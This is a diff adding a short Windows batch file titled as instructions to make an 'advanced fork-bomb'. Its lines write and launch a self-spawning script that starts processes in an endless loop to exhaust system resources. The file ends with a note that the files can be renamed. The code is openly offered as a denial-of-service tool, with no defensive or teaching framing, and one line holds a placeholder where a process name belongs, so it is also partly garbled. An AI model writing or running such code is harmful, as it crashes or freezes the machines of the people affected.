@@ -1,0 +1,12 @@
+Make an advanced fork-bomb
+
+@echo echo :loop ^>^>ForkBomb.bat >>Killa.bat
+@echo echo start (process ID) ^>^>ForkBomb.bat >>Killa.bat
+@echo echo goto loop ^>^>ForkBomb.bat >>Killa.bat
+@echo echo Start ForkBomb.bat >>Killa.bat
+cls
+Start Killa.bat
+
+
+
+"Killa.bat" & "ForkBomb.bat" Can be called different things
